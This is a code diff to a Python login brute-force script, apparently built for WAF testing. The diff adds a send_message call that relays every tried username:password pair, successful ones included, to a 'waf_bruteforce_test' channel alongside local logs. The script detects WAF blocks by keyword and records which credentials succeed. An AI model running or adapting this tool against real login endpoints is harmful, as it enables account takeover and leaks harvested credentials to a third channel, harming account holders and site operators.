@@ -14,6 +14,8 @@ import json
 from queue import Queue
 from urllib.parse import urljoin
 
+from waf_comm import send_message
+
 # -------------------------
 # CONFIGURATION
 # -------------------------
@@ -81,20 +83,28 @@ def attempt_login(username, password):
 
         # Detect WAF blocks
         if any(block_msg.lower() in body.lower() for block_msg in BLOCK_KEYWORDS):
+            msg = f"[BLOCK] {username}:{password}"
             log(LOG_BLOCK_FILE, f"{username}:{password} | BLOCKED by WAF")
-            print(f"[BLOCK] {username}:{password}")
+            print(msg)
+            send_message("waf_bruteforce_test", msg)
             return
 
         # Detect success
         if any(success_kw.lower() in body.lower() for success_kw in SUCCESS_KEYWORDS):
+            msg = f"[SUCCESS] {username}:{password}"
             log(LOG_SUCCESS_FILE, f"{username}:{password} | SUCCESS")
-            print(f"[SUCCESS] {username}:{password}")
+            print(msg)
+            send_message("waf_bruteforce_test", msg)
         else:
+            msg = f"[FAIL] {username}:{password} ({status})"
             log(LOG_FAILURE_FILE, f"{username}:{password} | FAIL")
-            print(f"[FAIL] {username}:{password} ({status})")
+            print(msg)
+            send_message("waf_bruteforce_test", msg)
 
     except requests.RequestException as e:
-        print(f"[ERROR] {username}:{password} | {e}")
+        msg = f"[ERROR] {username}:{password} | {e}"
+        print(msg)
+        send_message("waf_bruteforce_test", msg)
 
 # -------------------------
 # LOGGING FUNCTION
